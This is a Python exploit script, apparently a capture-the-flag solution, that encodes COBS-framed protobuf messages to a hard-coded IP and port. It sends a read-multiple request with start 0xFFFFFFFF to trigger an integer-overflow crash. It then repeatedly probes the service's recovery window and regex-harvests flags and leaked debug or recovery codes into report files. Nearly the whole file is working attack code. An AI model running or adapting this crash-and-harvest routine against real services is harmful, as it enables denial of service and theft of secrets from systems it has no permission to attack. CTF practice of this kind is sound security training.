#!/usr/bin/env python3

import json
import re
import socket
import time
from pathlib import Path

HOST = "34.40.133.67"
PORT = 6767
OUT_DIR = Path("ctf-result")
OUT_DIR.mkdir(exist_ok=True)


def encode_varint(value: int) -> bytes:
    out = bytearray()
    while value >= 0x80:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def cobs_encode(data: bytes) -> bytes:
    out = bytearray([0])
    code_index = 0
    code = 1
    for byte in data:
        if byte == 0:
            out[code_index] = code
            code_index = len(out)
            out.append(0)
            code = 1
        else:
            out.append(byte)
            code += 1
            if code == 0xFF:
                out[code_index] = code
                code_index = len(out)
                out.append(0)
                code = 1
    out[code_index] = code
    return bytes(out)


def cobs_decode(data: bytes) -> bytes:
    out = bytearray()
    pos = 0
    while pos < len(data):
        code = data[pos]
        if code == 0:
            raise ValueError("zero inside COBS frame")
        pos += 1
        end = pos + code - 1
        if end > len(data):
            raise ValueError("truncated COBS frame")
        out.extend(data[pos:end])
        pos = end
        if code != 0xFF and pos < len(data):
            out.append(0)
    return bytes(out)


def read_varint(data: bytes, pos: int) -> tuple[int, int]:
    value = 0
    shift = 0
    while pos < len(data):
        byte = data[pos]
        pos += 1
        value |= (byte & 0x7F) << shift
        if byte < 0x80:
            return value, pos
        shift += 7
        if shift >= 64:
            raise ValueError("oversized varint")
    raise ValueError("truncated varint")


def extract_text(raw: bytes) -> list[str]:
    texts: list[str] = []
    for frame in raw.split(b"\x00"):
        if not frame:
            continue
        try:
            decoded = cobs_decode(frame)
        except Exception:
            decoded = frame
        # Normal ServerResponse is field 1, length-delimited.
        try:
            if decoded and decoded[0] == 0x0A:
                length, pos = read_varint(decoded, 1)
                value = decoded[pos:pos + length]
                texts.append(value.decode("utf-8", errors="replace"))
                continue
        except Exception:
            pass
        texts.append(decoded.decode("utf-8", errors="replace"))
    return texts


def make_echo(text: str) -> bytes:
    value = text.encode()
    protobuf = b"\x0a" + encode_varint(len(value)) + value
    return cobs_encode(protobuf) + b"\x00"


def make_read_multiple(start: int, count: int) -> bytes:
    inner = b""
    if start != 0:
        inner += b"\x08" + encode_varint(start)
    if count != 0:
        inner += b"\x10" + encode_varint(count)
    protobuf = b"\x2a" + encode_varint(len(inner)) + inner
    return cobs_encode(protobuf) + b"\x00"


def exchange(payload: bytes | None, connect_timeout: float = 3.0,
             read_timeout: float = 1.5, pre_read: float = 0.0) -> dict:
    result: dict = {"ok": False, "error": None, "raw_hex": "", "texts": []}
    try:
        with socket.create_connection((HOST, PORT), timeout=connect_timeout) as sock:
            sock.settimeout(read_timeout)
            received = bytearray()
            if pre_read > 0:
                sock.settimeout(pre_read)
                try:
                    first = sock.recv(4096)
                    if first:
                        received.extend(first)
                except socket.timeout:
                    pass
                sock.settimeout(read_timeout)
            if payload is not None:
                sock.sendall(payload)
            deadline = time.monotonic() + read_timeout
            while time.monotonic() < deadline:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                received.extend(chunk)
                if b"\x00" in chunk:
                    # Allow a short interval for a second recovery frame.
                    sock.settimeout(0.25)
            raw = bytes(received)
            result["ok"] = True
            result["raw_hex"] = raw.hex()
            result["texts"] = extract_text(raw)
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    return result


def main() -> None:
    report: dict = {
        "host": HOST,
        "port": PORT,
        "protocol": "COBS-delimited protobuf",
        "trigger": {"start": 0xFFFFFFFF, "count": 1},
        "events": [],
    }

    # Establish a normal baseline without requesting any flag.
    baseline = exchange(make_echo("baseline"))
    baseline["name"] = "baseline_echo"
    baseline["elapsed"] = 0.0
    report["events"].append(baseline)

    # Intentional u32 overflow candidate: start + count wraps in an unchecked
    # read-multiple implementation. Only one crash candidate is sent.
    trigger_started = time.monotonic()
    trigger = exchange(
        make_read_multiple(0xFFFFFFFF, 1),
        connect_timeout=5.0,
        read_timeout=3.0,
        pre_read=0.2,
    )
    trigger["name"] = "overflow_trigger"
    trigger["elapsed"] = time.monotonic() - trigger_started
    report["events"].append(trigger)

    # Observe the bounded recovery window. Each attempt first waits briefly for
    # an unsolicited recovery/debug frame, then sends a harmless echo request.
    recovery_start = time.monotonic()
    for attempt in range(36):
        event = exchange(
            make_echo("recovery-probe"),
            connect_timeout=1.5,
            read_timeout=1.0,
            pre_read=0.35,
        )
        event["name"] = f"recovery_{attempt:02d}"
        event["elapsed"] = time.monotonic() - recovery_start
        report["events"].append(event)
        time.sleep(0.5)

    all_text = "\n".join(
        text
        for event in report["events"]
        for text in event.get("texts", [])
    )
    report["matches"] = {
        "flags": sorted(set(re.findall(r"bushbash\{[^}\r\n]+\}", all_text))),
        "debug_candidates": sorted(set(re.findall(
            r"(?i)(?:debug(?:ging)?(?: code)?|recovery code|code)\s*[:=]\s*([A-Za-z0-9_-]{4,128})",
            all_text,
        ))),
    }

    (OUT_DIR / "report.json").write_text(
        json.dumps(report, indent=2, ensure_ascii=False),
        encoding="utf-8",
    )
    (OUT_DIR / "all_text.txt").write_text(all_text, encoding="utf-8")
    print("Protocol probe completed; response content was written only to the artifact.")


if __name__ == "__main__":
    main()
